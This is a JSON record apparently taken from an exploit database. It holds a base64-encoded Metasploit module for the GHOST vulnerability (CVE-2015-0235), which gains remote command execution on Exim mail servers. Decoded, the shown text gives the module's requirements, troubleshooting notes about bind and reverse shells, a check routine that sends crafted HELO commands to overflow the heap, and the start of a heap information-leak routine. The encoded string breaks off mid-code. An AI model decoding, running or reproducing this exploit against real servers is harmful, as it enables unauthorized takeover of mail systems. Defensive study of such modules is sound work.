{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDQgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gR3JlYXRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6VGNwDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgPT4gJ0V4aW0gR0hPU1QgKGdsaWJjIGdldGhvc3RieW5hbWUpIEJ1ZmZlciBPdmVyZmxvdycsDQogICAgICAnRGVzY3JpcHRpb24nID0+ICVxKA0KICAgICAgICBUaGlzIG1vZHVsZSByZW1vdGVseSBleHBsb2l0cyBDVkUtMjAxNS0wMjM1IChhLmsuYS4gR0hPU1QsIGEgaGVhcC1iYXNlZA0KICAgICAgICBidWZmZXIgb3ZlcmZsb3cgaW4gdGhlIEdOVSBDIExpYnJhcnkncyBnZXRob3N0YnluYW1lIGZ1bmN0aW9ucykgb24geDg2DQogICAgICAgIGFuZCB4ODZfNjQgR05VL0xpbnV4IHN5c3RlbXMgdGhhdCBydW4gdGhlIEV4aW0gbWFpbCBzZXJ2ZXIuIFRlY2huaWNhbA0KICAgICAgICBpbmZvcm1hdGlvbiBhYm91dCB0aGUgZXhwbG9pdGF0aW9uIGNhbiBiZSBmb3VuZCBpbiB0aGUgb3JpZ2luYWwgR0hPU1QNCiAgICAgICAgYWR2aXNvcnksIGFuZCBpbiB0aGUgc291cmNlIGNvZGUgb2YgdGhpcyBtb2R1bGUuDQogICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgICBTRVJWRVItU0lERSBSRVFVSVJFTUVOVFMgKEV4aW0pDQogICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgICBUaGUgcmVtb3RlIHN5c3RlbSBtdXN0IHVzZSBhIHZ1bG5lcmFibGUgdmVyc2lvbiBvZiB0aGUgR05VIEMgTGlicmFyeToNCiAgICAgICAgdGhlIGZpcnN0IGV4cGxvaXRhYmxlIHZlcnNpb24gaXMgZ2xpYmMtMi42LCB0aGUgbGFzdCBleHBsb2l0YWJsZSB2ZXJzaW9uDQogICAgICAgIGlzIGdsaWJjLTIuMTc7IG9sZGVyIHZlcnNpb25zIG1pZ2h0IGJlIGV4cGxvaXRhYmxlIHRvbywgYnV0IHRoaXMgbW9kdWxlDQogICAgICAgIGRlcGVuZHMgb24gdGhlIG5ld2VyIHZlcnNpb25zJyBmZF9uZXh0c2l6ZSAoYSBtZW1iZXIgb2YgdGhlIG1hbGxvY19jaHVuaw0KICAgICAgICBzdHJ1Y3R1cmUpIHRvIHJlbW90ZWx5IG9idGFpbiB0aGUgYWRkcmVzcyBvZiBFeGltJ3Mgc210cF9jbWRfYnVmZmVyIGluDQogICAgICAgIHRoZSBoZWFwLg0KICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICAgICAgVGhlIHJlbW90ZSBzeXN0ZW0gbXVzdCBydW4gdGhlIEV4aW0gbWFpbCBzZXJ2ZXI6IHRoZSBmaXJzdCBleHBsb2l0YWJsZQ0KICAgICAgICB2ZXJzaW9uIGlzIGV4aW0tNC43Nzsgb2xkZXIgdmVyc2lvbnMgbWlnaHQgYmUgZXhwbG9pdGFibGUgdG9vLCBidXQgdGhpcw0KICAgICAgICBtb2R1bGUgZGVwZW5kcyBvbiB0aGUgbmV3ZXIgdmVyc2lvbnMnIDE2LUtCIHNtdHBfY21kX2J1ZmZlciB0byByZWxpYWJseQ0KICAgICAgICBzZXQgdXAgdGhlIGhlYXAgYXMgZGVzY3JpYmVkIGluIHRoZSBHSE9TVCBhZHZpc29yeS4NCiAgICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAgICAgIFRoZSByZW1vdGUgRXhpbSBtYWlsIHNlcnZlciBtdXN0IGJlIGNvbmZpZ3VyZWQgdG8gcGVyZm9ybSBleHRyYSBzZWN1cml0eQ0KICAgICAgICBjaGVja3MgYWdhaW5zdCBpdHMgU01UUCBjbGllbnRzOiBlaXRoZXIgdGhlIGhlbG9fdHJ5X3ZlcmlmeV9ob3N0cyBvciB0aGUNCiAgICAgICAgaGVsb192ZXJpZnlfaG9zdHMgb3B0aW9uIG11c3QgYmUgZW5hYmxlZDsgdGhlICJ2ZXJpZnkgPSBoZWxvIiBBQ0wgbWlnaHQNCiAgICAgICAgYmUgZXhwbG9pdGFibGUgdG9vLCBidXQgaXMgdW5wcmVkaWN0YWJsZSBhbmQgdGhlcmVmb3JlIG5vdCBzdXBwb3J0ZWQgYnkNCiAgICAgICAgdGhpcyBtb2R1bGUuDQogICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgICBDTElFTlQtU0lERSBSRVFVSVJFTUVOVFMgKE1ldGFzcGxvaXQpDQogICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgICBUaGlzIG1vZHVsZSdzICJleHBsb2l0IiBtZXRob2QgcmVxdWlyZXMgdGhlIFNFTkRFUl9IT1NUX0FERFJFU1Mgb3B0aW9uDQogICAgICAgIHRvIGJlIHNldCB0byB0aGUgSVB2NCBhZGRyZXNzIG9mIHRoZSBTTVRQIGNsaWVudCAoTWV0YXNwbG9pdCksIGFzIHNlZW4NCiAgICAgICAgYnkgdGhlIFNNVFAgc2VydmVyIChFeGltKTsgYWRkaXRpb25hbGx5LCB0aGlzIElQdjQgYWRkcmVzcyBtdXN0IGhhdmUNCiAgICAgICAgYm90aCBmb3J3YXJkIGFuZCByZXZlcnNlIEROUyBlbnRyaWVzIHRoYXQgbWF0Y2ggZWFjaCBvdGhlcg0KICAgICAgICAoRm9yd2FyZC1Db25maXJtZWQgcmV2ZXJzZSBETlMpLg0KICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICAgICAgVGhlIHJlbW90ZSBFeGltIHNlcnZlciBtaWdodCBiZSBleHBsb2l0YWJsZSBldmVuIGlmIHRoZSBNZXRhc3Bsb2l0DQogICAgICAgIGNsaWVudCBoYXMgbm8gRkNyRE5TLCBidXQgdGhpcyBtb2R1bGUgZGVwZW5kcyBvbiBFeGltJ3Mgc2VuZGVyX2hvc3RfbmFtZQ0KICAgICAgICB2YXJpYWJsZSB0byBiZSBzZXQgaW4gb3JkZXIgdG8gcmVsaWFibHkgY29udHJvbCB0aGUgc3RhdGUgb2YgdGhlIHJlbW90ZQ0KICAgICAgICBoZWFwLg0KICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICAgICAgVFJPVUJMRVNIT09USU5HDQogICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgICAiYmFkIFNFTkRFUl9IT1NUX0FERFJFU1MgKG5pbCkiIGZhaWx1cmU6IHRoZSBTRU5ERVJfSE9TVF9BRERSRVNTIG9wdGlvbg0KICAgICAgICB3YXMgbm90IHNwZWNpZmllZC4NCiAgICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAgICAgICJiYWQgU0VOREVSX0hPU1RfQUREUkVTUyAobm90IGluIElQdjQgZG90dGVkLWRlY2ltYWwgbm90YXRpb24pIiBmYWlsdXJlOg0KICAgICAgICB0aGUgU0VOREVSX0hPU1RfQUREUkVTUyBvcHRpb24gd2FzIHNwZWNpZmllZCwgYnV0IG5vdCBpbiBJUHY0DQogICAgICAgIGRvdHRlZC1kZWNpbWFsIG5vdGF0aW9uLg0KICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICAgICAgImJhZCBTRU5ERVJfSE9TVF9BRERSRVNTIChoZWxvX3ZlcmlmeV9ob3N0cykiIG9yDQogICAgICAgICJiYWQgU0VOREVSX0hPU1RfQUREUkVTUyAoaGVsb190cnlfdmVyaWZ5X2hvc3RzKSIgZmFpbHVyZTogdGhlDQogICAgICAgIFNFTkRFUl9IT1NUX0FERFJFU1Mgb3B0aW9uIGRvZXMgbm90IG1hdGNoIHRoZSBJUHY0IGFkZHJlc3Mgb2YgdGhlIFNNVFANCiAgICAgICAgY2xpZW50IChNZXRhc3Bsb2l0KSwgYXMgc2VlbiBieSB0aGUgU01UUCBzZXJ2ZXIgKEV4aW0pLg0KICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICAgICAgImJhZCBTRU5ERVJfSE9TVF9BRERSRVNTIChubyBGQ3JETlMpIiBmYWlsdXJlOiB0aGUgSVB2NCBhZGRyZXNzIG9mIHRoZQ0KICAgICAgICBTTVRQIGNsaWVudCAoTWV0YXNwbG9pdCkgaGFzIG5vIEZvcndhcmQtQ29uZmlybWVkIHJldmVyc2UgRE5TLg0KICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICAgICAgIm5vdCB2dWxuPyBvbGQgZ2xpYmM/IChubyBsZWFrZWRfYXJjaCkiIGZhaWx1cmU6IHRoZSByZW1vdGUgRXhpbSBzZXJ2ZXINCiAgICAgICAgaXMgZWl0aGVyIG5vdCB2dWxuZXJhYmxlLCBvciBub3QgZXhwbG9pdGFibGUgKGdsaWJjIHZlcnNpb25zIG9sZGVyIHRoYW4NCiAgICAgICAgZ2xpYmMtMi42IGhhdmUgbm8gZmRfbmV4dHNpemUgbWVtYmVyIGluIHRoZWlyIG1hbGxvY19jaHVuayBzdHJ1Y3R1cmUpLg0KICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICAgICAgIk5VTCwgQ1IsIExGIGluIGFkZHI/IChubyBsZWFrZWRfYWRkcikiIGZhaWx1cmU6IEV4aW0ncyBoZWFwIGFkZHJlc3MNCiAgICAgICAgY29udGFpbnMgYmFkIGNoYXJhY3RlcnMgKE5VTCwgQ1IsIExGKSBhbmQgd2FzIHRoZXJlZm9yZSBtYW5nbGVkIGR1cmluZw0KICAgICAgICB0aGUgaW5mb3JtYXRpb24gbGVhazsgdGhpcyBleHBsb2l0IGlzIGFibGUgdG8gcmVjb25zdHJ1Y3QgbW9zdCBvZiB0aGVzZQ0KICAgICAgICBhZGRyZXNzZXMsIGJ1dCBub3QgYWxsICh3b3JzdC1jYXNlIHByb2JhYmlsaXR5IGlzIH4xLzg1LCBidXQgY291bGQgYmUNCiAgICAgICAgZnVydGhlciBpbXByb3ZlZCkuDQogICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgICAiQnJ1dGUtZm9yY2UgU1VDQ0VTUyIgZm9sbG93ZWQgYnkgYSBuaWwgcmVwbHksIGJ1dCBubyBzaGVsbDogdGhlIHJlbW90ZQ0KICAgICAgICBVbml4IGNvbW1hbmQgd2FzIGV4ZWN1dGVkLCBidXQgc3Bhd25lZCBhIGJpbmQtc2hlbGwgb3IgYSByZXZlcnNlLXNoZWxsDQogICAgICAgIHRoYXQgZmFpbGVkIHRvIGNvbm5lY3QgKG1heWJlIGJlY2F1c2Ugb2YgYSBmaXJld2FsbCwgb3IgYSBOQVQsIGV0YykuDQogICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgICAgICAiQnJ1dGUtZm9yY2UgU1VDQ0VTUyIgZm9sbG93ZWQgYnkgYSBub24tbmlsIHJlcGx5LCBhbmQgbm8gc2hlbGw6IHRoZQ0KICAgICAgICByZW1vdGUgVW5peCBjb21tYW5kIHdhcyBleGVjdXRlZCwgYnV0IGZhaWxlZCB0byBzcGF3biB0aGUgc2hlbGwgKG1heWJlDQogICAgICAgIGJlY2F1c2UgdGhlIHNldHNpZCBjb21tYW5kIGRvZXNuJ3QgZXhpc3QsIG9yIGF3ayBpc24ndCBnYXdrLCBvciBuZXRjYXQNCiAgICAgICAgZG9lc24ndCBzdXBwb3J0IHRoZSAtNiBvciAtZSBvcHRpb24sIG9yIHRlbG5ldCBkb2Vzbid0IHN1cHBvcnQgdGhlIC16DQogICAgICAgIG9wdGlvbiwgZXRjKS4NCiAgICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogICAgICAgIENvbW1lbnRzIGFuZCBxdWVzdGlvbnMgYXJlIHdlbGNvbWUhDQogICAgICApLA0KICAgICAgJ0F1dGhvcicgPT4gWydRdWFseXMsIEluYy4gPHFzYVthdF1xdWFseXMuY29tPiddLA0KICAgICAgJ0xpY2Vuc2UnID0+IEJTRF9MSUNFTlNFLA0KICAgICAgJ1JlZmVyZW5jZXMnID0+IFsNCiAgICAgICAgWydDVkUnLCAnMjAxNS0wMjM1J10sDQogICAgICAgIFsnVVMtQ0VSVC1WVScsICc5NjczMzInXSwNCiAgICAgICAgWydPU1ZEQicsICcxMTc1NzknXSwNCiAgICAgICAgWydCSUQnLCAnNzIzMjUnXSwNCiAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly93d3cucXVhbHlzLmNvbS9yZXNlYXJjaC9zZWN1cml0eS1hZHZpc29yaWVzL0dIT1NULUNWRS0yMDE1LTAyMzUudHh0J10NCiAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdKYW4gMjcgMjAxNScsDQogICAgICAnUHJpdmlsZWdlZCcgPT4gZmFsc2UsICMgdWlkPTEwMShEZWJpYW4tZXhpbSkgZ2lkPTEwMyhEZWJpYW4tZXhpbSkgZ3JvdXBzPTEwMyhEZWJpYW4tZXhpbSkNCiAgICAgICdQbGF0Zm9ybScgPT4gJ3VuaXgnLCAjIGFjdHVhbGx5ICdsaW51eCcsIGJ1dCB3ZSBleGVjdXRlIGEgdW5peC1jb21tYW5kIHBheWxvYWQNCiAgICAgICdBcmNoJyA9PiBBUkNIX0NNRCwgIyBhY3R1YWxseSBbQVJDSF9YODYsIEFSQ0hfWDg2XzY0XSwgYnV0IF4NCiAgICAgICdQYXlsb2FkJyA9PiB7DQogICAgICAgICdTcGFjZScgPT4gMjU1LCAjIHRoZSBzaG9ydGVyIHRoZSBwYXlsb2FkLCB0aGUgaGlnaGVyIHRoZSBwcm9iYWJpbGl0eSBvZiBjb2RlIGV4ZWN1dGlvbg0KICAgICAgICAnQmFkQ2hhcnMnID0+ICIiLCAjIHdlIGVuY29kZSB0aGUgcGF5bG9hZCBvdXJzZWx2ZXMsIGJlY2F1c2UgXg0KICAgICAgICAnRGlzYWJsZU5vcHMnID0+IHRydWUsDQogICAgICAgICdBY3RpdmVUaW1lb3V0JyA9PiAyNCo2MCo2MCAjIHdlIG1heSBuZWVkIG1vcmUgdGhhbiAxNTAgcyB0byBleGVjdXRlIG91ciBiaW5kLXNoZWxsDQogICAgICB9LA0KICAgICAgJ1RhcmdldHMnID0+IFtbJ0F1dG9tYXRpYycsIHt9XV0sDQogICAgICAnRGVmYXVsdFRhcmdldCcgPT4gMA0KICAgICkpDQoNCiAgICByZWdpc3Rlcl9vcHRpb25zKFsNCiAgICAgIE9wdDo6UlBPUlQoMjUpLA0KICAgICAgT3B0QWRkcmVzcy5uZXcoJ1NFTkRFUl9IT1NUX0FERFJFU1MnLCBbZmFsc2UsDQogICAgICAgICdUaGUgSVB2NCBhZGRyZXNzIG9mIHRoZSBTTVRQIGNsaWVudCAoTWV0YXNwbG9pdCksIGFzIHNlZW4gYnkgdGhlIFNNVFAgc2VydmVyIChFeGltKScsIG5pbF0pDQogICAgXSwgc2VsZi5jbGFzcykNCg0KICAgIHJlZ2lzdGVyX2FkdmFuY2VkX29wdGlvbnMoWw0KICAgICAgT3B0Qm9vbC5uZXcoJ0lfS05PV19XSEFUX0lfQU1fRE9JTkcnLCBbZmFsc2UsICdQbGVhc2UgcmVhZCB0aGUgc291cmNlIGNvZGUgZm9yIGRldGFpbHMnLCBuaWxdKQ0KICAgIF0sIHNlbGYuY2xhc3MpDQogIGVuZA0KDQogIGRlZiBjaGVjaw0KICAgICMgZm9yIG5vdywgbm8gaW5mb3JtYXRpb24gYWJvdXQgdGhlIHZ1bG5lcmFibGUgc3RhdGUgb2YgdGhlIHRhcmdldA0KICAgIGNoZWNrX2NvZGUgPSBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCg0KICAgIGJlZ2luDQogICAgICAjIG5vdCBleHBsb2l0aW5nLCBqdXN0IGNoZWNraW5nDQogICAgICBzbXRwX2Nvbm5lY3QoZmFsc2UpDQoNCiAgICAgICMgbWFsbG9jKClhdGUgZ2V0aG9zdGJ5bmFtZSdzIGJ1ZmZlciwgYW5kDQogICAgICAjIG1ha2Ugc3VyZSBpdHMgbmV4dF9jaHVuayBpc24ndCB0aGUgdG9wIGNodW5rDQoNCiAgICAgIDkudGltZXMgZG8NCiAgICAgICAgc210cF9zZW5kKCJIRUxPICIsICIiLCAiMCIsICIiLCAiIiwgMTAyNCsxNi0xKzApDQogICAgICAgIHNtdHBfcmVjdihIRUxPX0NPREVTKQ0KICAgICAgZW5kDQoNCiAgICAgICMgb3ZlcmZsb3cgKDQgYnl0ZXMpIGdldGhvc3RieW5hbWUncyBidWZmZXIsIGFuZA0KICAgICAgIyBvdmVyd3JpdGUgaXRzIG5leHRfY2h1bmsncyBzaXplIGZpZWxkIHdpdGggMHgwMDMwMzAzMA0KDQogICAgICBzbXRwX3NlbmQoIkhFTE8gIiwgIiIsICIwIiwgIiIsICIiLCAxMDI0KzE2LTErNCkNCiAgICAgICMgZnJvbSBub3cgb24sIGFuIGV4Y2VwdGlvbiBtZWFucyB2dWxuZXJhYmxlDQogICAgICBjaGVja19jb2RlID0gRXhwbG9pdDo6Q2hlY2tDb2RlOjpWdWxuZXJhYmxlDQogICAgICAjIHJhaXNlIGFuIGV4Y2VwdGlvbiBpZiBubyB2YWxpZCBTTVRQIHJlcGx5DQogICAgICByZXBseSA9IHNtdHBfcmVjdihBTllfQ09ERSkNCiAgICAgICMgY2FuJ3QgZGV0ZXJtaW5lIHZ1bG5lcmFibGUgc3RhdGUgaWYgc210cF92ZXJpZnlfaGVsbygpIGlzbid0IGNhbGxlZA0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6VW5rbm93biBpZiByZXBseVs6Y29kZV0gIX4gLyN7SEVMT19DT0RFU30vDQoNCiAgICAgICMgcmVhbGxvYygpYXRlIGdldGhvc3RieW5hbWUncyBidWZmZXIsIGFuZA0KICAgICAgIyBjcmFzaCAob2xkIGdsaWJjKSBvciBhYm9ydCAobmV3IGdsaWJjKQ0KICAgICAgIyBvbiB0aGUgb3ZlcndyaXR0ZW4gc2l6ZSBmaWVsZA0KDQogICAgICBzbXRwX3NlbmQoIkhFTE8gIiwgIiIsICIwIiwgIiIsICIiLCAyMDQ4LTE2LTErNCkNCiAgICAgICMgcmFpc2UgYW4gZXhjZXB0aW9uIGlmIG5vIHZhbGlkIFNNVFAgcmVwbHkNCiAgICAgIHJlcGx5ID0gc210cF9yZWN2KEFOWV9DT0RFKQ0KICAgICAgIyBjYW4ndCBkZXRlcm1pbmUgdnVsbmVyYWJsZSBzdGF0ZSBpZiBzbXRwX3ZlcmlmeV9oZWxvKCkgaXNuJ3QgY2FsbGVkDQogICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duIGlmIHJlcGx5Wzpjb2RlXSAhfiAvI3tIRUxPX0NPREVTfS8NCiAgICAgICMgYSB2dWxuZXJhYmxlIHRhcmdldCBzaG91bGQndmUgY3Jhc2hlZCBieSBub3cNCiAgICAgIGNoZWNrX2NvZGUgPSBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCg0KICAgIHJlc2N1ZQ0KICAgICAgcGVlciA9ICIje3Job3N0fToje3Jwb3J0fSINCiAgICAgIHZwcmludF9kZWJ1ZygiI3twZWVyfSAtIENhdWdodCAjeyQhLmNsYXNzfTogI3skIS5tZXNzYWdlfSIpDQoNCiAgICBlbnN1cmUNCiAgICAgIHNtdHBfZGlzY29ubmVjdA0KICAgIGVuZA0KDQogICAgcmV0dXJuIGNoZWNrX2NvZGUNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICB1bmxlc3MgZGF0YXN0b3JlWydJX0tOT1dfV0hBVF9JX0FNX0RPSU5HJ10NCiAgICAgIHByaW50X3N0YXR1cygiQ2hlY2tpbmcgaWYgdGFyZ2V0IGlzIHZ1bG5lcmFibGUuLi4iKQ0KICAgICAgZmFpbF93aXRoKCJleHBsb2l0IiwgIlZ1bG5lcmFiaWxpdHkgY2hlY2sgZmFpbGVkLiIpIGlmIGNoZWNrICE9IEV4cGxvaXQ6OkNoZWNrQ29kZTo6VnVsbmVyYWJsZQ0KICAgICAgcHJpbnRfZ29vZCgiVGFyZ2V0IGlzIHZ1bG5lcmFibGUuIikNCiAgICBlbmQNCiAgICBpbmZvcm1hdGlvbl9sZWFrDQogICAgY29kZV9leGVjdXRpb24NCiAgZW5kDQoNCiAgcHJpdmF0ZQ0KDQogIEhFTE9fQ09ERVMgPSAnMjUwfDQ1MXw1NTAnDQogIEFOWV9DT0RFID0gJ1swLTldezN9Jw0KDQogIE1JTl9IRUFQX1NISUZUID0gODANCiAgTUlOX0hFQVBfU0laRSA9IDEyOCAqIDEwMjQNCiAgTUFYX0hFQVBfU0laRSA9IDEwMjQgKiAxMDI0DQoNCiAgIyBFeGltDQogIEFMSUdOTUVOVCA9IDgNCiAgU1RPUkVfQkxPQ0tfU0laRSA9IDgxOTINCiAgU1RPUkVQT09MX01JTl9TSVpFID0gMjU2DQoNCiAgTE9HX0JVRkZFUl9TSVpFID0gODE5Mg0KICBCSUdfQlVGRkVSX1NJWkUgPSAxNjM4NA0KDQogIFNNVFBfQ01EX0JVRkZFUl9TSVpFID0gMTYzODQNCiAgSU5fQlVGRkVSX1NJWkUgPSA4MTkyDQoNCiAgIyBHTlUgQyBMaWJyYXJ5DQogIFBSRVZfSU5VU0UgPSAweDENCiAgTlNfTUFYRE5BTUUgPSAxMDI1DQoNCiAgIyBMaW51eA0KICBNTUFQX01JTl9BRERSID0gNjU1MzYNCg0KICBkZWYgaW5mb3JtYXRpb25fbGVhaw0KICAgIHByaW50X3N0YXR1cygiVHJ5aW5nIGluZm9ybWF0aW9uIGxlYWsuLi4iKQ0KICAgIGxlYWtlZF9hcmNoID0gbmlsDQogICAgbGVha2VkX2FkZHIgPSBbXQ0KDQogICAgIyB0cnkgZGlmZmVyZW50IGhlYXBfc2hpZnQgdmFsdWVzLCBpbiBjYXNlIEV4aW0ncyBoZWFwIGFkZHJlc3MgY29udGFpbnMNCiAgICAjIGJhZCBjaGFycyAoTlVMLCBDUiwgTEYpIGFuZCB3YXMgbWFuZ2xlZCBkdXJpbmcgdGhlIGluZm9ybWF0aW9uIGxlYWs7DQogICAgIyB3ZSdsbCBrZWVwIHRoZSBsb25nZXN0IG9uZSAodGhlIGxlYXN0IGxpa2VseSB0byBoYXZlIGJlZW4gdHJ1bmNhdGVkKQ0KDQogICAgMTYudGltZXMgZG8NCiAgICAgIGRvbmUgPSBjYXRjaCg6YW5vdGhlcl9oZWFwX3NoaWZ0KSBkbw0KICAgICAgICBoZWFwX3NoaWZ0ID0gTUlOX0hFQVBfU0hJRlQgKyAocmFuZCgxMDI0KSAmIH4xNSkNCiAgICAgICAgcHJpbnRfZGVidWcoIiN7eyBoZWFwX3NoaWZ0OiBoZWFwX3NoaWZ0IH19IikNCg0KICAgICAgICAjIHdyaXRlIHRoZSBtYWxsb2NfY2h1bmsgaGVhZGVyIGF0IGluY3JlYXNpbmcgb2Zmc2V0cyAoOC1ieXRlIHN0ZXApLA0KICAgICAgICAjIHVudGlsIHdlIG92ZXJ3cml0ZSB0aGUgIjUwMyBzZW5kZXIgbm90IHlldCBnaXZlbiIgZXJyb3IgbWVzc2FnZQ0KDQogICAgICAgIDEyOC5zdGVwKDI1NiwgOCkgZG8gfHdyaXRlX29mZnNldHwNCiAgICAgICAgICBlcnJvciA9IHRyeV9pbmZvcm1hdGlvbl9sZWFrKGhlYXBfc2hpZnQsIHdyaXRlX29mZnNldCkNCiAgICAgICAgICBwcmludF9kZWJ1ZygiI3t7IHdyaXRlX29mZnNldDogd3JpdGVfb2Zmc2V0LCBlcnJvcjogZXJyb3IgfX0iKQ0KICAgICAgICAgIHRocm93KDphbm90aGVyX2hlYXBfc2hpZnQpIGlmIG5vdCBlcnJvcg0KICAgICAgICAgIG5leHQgaWYgZXJyb3IgPT0gIjUwMyBzZW5kZXIgbm90IHlldCBnaXZlbiINCg0KICAgICAgICAgICMgdHJ5IGEgZmV3IG1vcmUgb2Zmc2V0cyAoYWxsb3dzIHVzIHRvIGRvdWJsZS1jaGVjayB0aGluZ3MsDQogICAgICAgICAgIyBhbmQgZGlzdGluZ3Vpc2ggYmV0d2VlbiAzMi1iaXQgYW5kIDY0LWJpdCBtYWNoaW5lcykNCg0KICAgICAgICAgIGVycm9yID0gW2Vycm9yXQ0KICAgICAgICAgIDEudXB0byg1KSBkbyB8aXwNCiAgICAgICAgICAgIGVycm9yW2ldID0gdHJ5X2luZm9ybWF0aW9uX2xlYWsoaGVhcF9zaGlmdCwgd3JpdGVfb2Zmc2V0ICsgaSo4KQ0KICAgICAgICAgICAgdGhyb3coOmFub3RoZXJfaGVhcF9zaGlmdCkgaWYgbm90IGVycm9yW2ldDQogICAgICAgICAgZW5kDQogICAgICAgICAgcHJpbnRfZGVidWcoIiN7eyBlcnJvcjogZXJyb3IgfX0iKQ0KDQogICAgICAgICAgX2xlYWtlZF9hcmNoID0gbGVha2VkX2FyY2gNCiAgICAgICAgICBpZiAoZXJyb3JbMF0gPT0gZXJyb3JbMV0pIGFuZCAoZXJyb3JbMF0uZW1wdHk/IG9yIChlcnJvclswXS51bnBhY2soJ0MnKVswXSAmIDcpID09IDApIGFuZCAjIGZkX25leHRzaXplDQogICAgICAgICAgICAgKGVycm9yWzJdID09IGVycm9yWzNdKSBhbmQgKGVycm9yWzJdLmVtcHR5PyBvciAoZXJyb3JbMl0udW5wYWNrKCdDJylbMF0gJiA3KSA9PSAwKSBhbmQgIyBmZA0KICAgICAgICAgICAgIChlcnJvcls0XSA9fiAvXEE1MDMgc2VuZFteZV0uP1x6L21uKSBhbmQgKChlcnJvcls0XS51bnBhY2soJ0MqJylbOF0gJiAxNSkgPT0gUFJFVl9JTlVTRSkgYW5kICMgc2l6ZQ0KICAgICAgICAgICAgIChlcnJvcls1XSA9PSAiMTc3IikgIyB0aGUgbGFzdCBceDdGIG9mIG91ciBCQUQxIGNvbW1hbmQsIGVuY29kZWQgYXMgXFwxNzcgYnkgc3RyaW5nX3ByaW50aW5nKCkNCiAgICAgICAgICAgIGxlYWtlZF9hcmNoID0gQVJDSF9YODZfNjQNCg0KICAgICAgICAgIGVsc2lmIChlcnJvclswXS5lbXB0eT8gb3IgKGVycm9yWzBdLnVucGFjaygnQycpWzBdICYgMykgPT0gMCkgYW5kICMgZmRfbmV4dHNpemUNCiAgICAgICAgICAgICAgICAoZXJyb3JbMV0uZW1wdHk/IG9yIChlcnJvclsxXS51bnBhY2soJ0Mn